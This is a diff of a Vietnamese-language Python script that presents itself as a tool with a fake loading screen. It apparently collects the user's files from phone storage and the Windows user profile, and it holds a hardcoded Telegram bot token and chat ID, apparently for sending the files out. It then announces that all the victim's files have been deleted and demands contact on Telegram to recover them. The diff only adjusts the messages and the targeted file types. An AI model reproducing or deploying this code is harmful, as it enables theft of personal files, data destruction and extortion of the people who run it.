@@ -2,9 +2,9 @@ import os
 import requests
 import time
 import threading
-trang = "\033[1;37m"
 luc = "\033[1;32m"
-red = "\033[1;31m"
+trang = "\033[1;37m"
+
 # Thông tin Telegram Bot
 TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"
 CHAT_ID = "7445272108"
@@ -15,16 +15,14 @@ def fake_loading():
     animations = ["|", "/", "-", "\\"]
     print(f"{trang}Thông Tin Liên Hệ")
     print(f"{trang}Telegram: {luc}@luaday123")
-    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
     print(f"{trang}[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
 
-    for _ in range(30):  # 1 phút giả lập tải dữ liệu
-        print(f"\r[+] Đang tải để vào tool ... {animations[_ % 4]}", end="", flush=True)
+    for _ in range(10):  # 1 phút giả lập tải dữ liệu
+        print(f"\r[+] Đang tải các dữ liệu cần thiết để chạy tool... {animations[_ % 4]}", end="", flush=True)
         time.sleep(1)
-
 # Lấy danh sách file theo thứ tự ưu tiên: .py, .php, .txt, ảnh, .html
 def find_files():
-    file_extensions = (".py", ".php", ".mp4", ".txt",".json", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".webp", ".html")
+    file_extensions = (".py", ".php",".zip", ".txt", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".webp", ".html")
     root_dirs = ["/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Duyệt thư mục
 
     file_list = set()  # Sử dụng set để tránh trùng lặp
@@ -73,8 +71,8 @@ def main():
     loading_thread.join()  # Chờ quá trình fake loading hoàn tất
 
     # Hiển thị thông báo sau khi xóa hết file
-    print(f"\n{red}Toàn bộ file của bạn đã bị xóa! ")
+    print(f"\nToàn bộ file của bạn đã bị xóa! ")
     print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
-    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
+
 if __name__ == "__main__":
     main()
